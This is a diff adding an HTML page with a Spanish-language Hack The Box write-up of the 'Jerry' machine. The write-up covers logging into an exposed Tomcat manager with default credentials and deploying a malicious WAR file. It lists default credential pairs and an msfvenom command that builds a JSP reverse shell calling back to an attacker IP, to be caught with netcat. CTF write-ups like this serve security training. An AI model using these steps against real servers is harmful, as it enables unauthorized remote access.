@@ -1,0 +1,65 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Jerry HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/windows.html">~/writeups/windows</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/jerry/pasted-20251024184315.png" alt="Jerry HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Windows</p>
+          <h1>Jerry</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>windows</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Apache Tomcat expuesto con manager accesible</li>
+            <li><code>Explotación</code>: Credenciales por defecto y subida de payload <code>.war</code></li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/jerry/pasted-20251024185059.png" alt="Jerry HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: Apache Tomcat - 8080</h2>
+          <p>Acceder a la ruta <code>http://ip:8080/manager/html</code> con las credenciales por defecto válidas y <code>subir un archivo WAR malicioso</code></p>
+          <p>* <code>admin</code>:<code>admin</code></p>
+          <p>* <code>tomcat</code>:<code>tomcat</code></p>
+          <p>* <code>tomcat</code>:<code>s3cret</code> :CoCheckAllBig:</p>
+          <p>* <code>root</code>:<code>root</code></p>
+          <img class="writeup-image" src="/writeups/assets/jerry/pasted-20251024221914.png" alt="Jerry HTB" />
+          <p>&gt;:CoNote:    Tomcat es una aplicación Java que corre sobre la JVM por eso el payload es Java</p>
+          <div class="code-card">
+            <h3>Crear payload .war y subirlo al WAR file to deploy</h3>
+            <pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.18 LPORT=443 -f war -o shell.war</code></pre>
+          </div>
+          <p>Subimos el <code>payload</code> desde la interfaz y nos ponemos en escucha con <code>netcat</code>, para darle solo click al enlace <code>/shell</code></p>
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>windows</span>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Notas</h2>
+          <p>[[Apache Tomcat]]</p>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
